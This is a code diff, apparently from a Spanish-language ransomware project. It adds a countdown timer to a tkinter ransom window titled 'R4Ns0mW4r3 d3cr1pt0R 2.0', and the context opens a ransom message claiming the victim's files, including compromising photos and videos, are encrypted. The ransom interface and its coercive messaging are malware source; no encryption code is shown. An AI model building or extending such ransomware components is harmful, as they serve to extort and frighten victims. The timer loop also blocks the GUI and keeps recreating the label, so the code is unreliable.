@@ -5,13 +5,15 @@ import images
 
 #Librería para los elementos de la GUI.
 import tkinter as tk  	
+import time
+import datetime
 
 class rescueWindow(object):
     Ventana = tk.Tk()
 
     def __init__(self):	#Constructor.
         self.crearVentana()	#Llamada al método crearVentana.
-    
+
     def crearVentana(self):	#Método para crear la ventana.
         self.Ventana.title("R4Ns0mW4r3 d3cr1pt0R 2.0")	#Título de la ventana.
         #self.Ventana.overrideredirect(1) #Esconde la barra superior.
@@ -58,6 +60,36 @@ class rescueWindow(object):
         #Añadiendo el elemento a la ventana.
         tiempo.grid(row = 3, column = 1)
 
+        #Reloj
+        #Timer
+        hours = 0 #Inicializando temporizador.
+        minutes = 0
+        seconds = 20
+
+        #Definiendo los segundos de las cifras de horas y minutos
+        s_horas = hours * 3600
+        s_minutos = minutes * 60
+
+        # Cálculo de número total de segundos
+        total_seconds = s_horas + s_minutos + seconds
+    
+        #Mientras segundos sea menor que cero, va a decrementar en uno.
+        while total_seconds > 0:
+    
+            temp = datetime.timedelta(seconds = total_seconds)
+            string = temp
+            reloj = tk.Label(self.Ventana, text = string,
+                            font="Verdana 18 bold",
+                            bg="#fff",
+                            fg="#00fb33",
+                            borderwidth=0)
+        #Añadiendo el elemento a la ventana.
+            reloj.grid(row = 4, column = 1)
+            time.sleep(1)
+            total_seconds -= 1
+    
+        print("Bzzzt! El tiempo terminó! Perdiste...")
+        
         #Mensaje
         mensaje = """Tus archivos importantes han sido cifrados. Entre ellos se encuentran documentos, fotos y videos comprometadores que te podrían generar problemas. 
 que hacer?
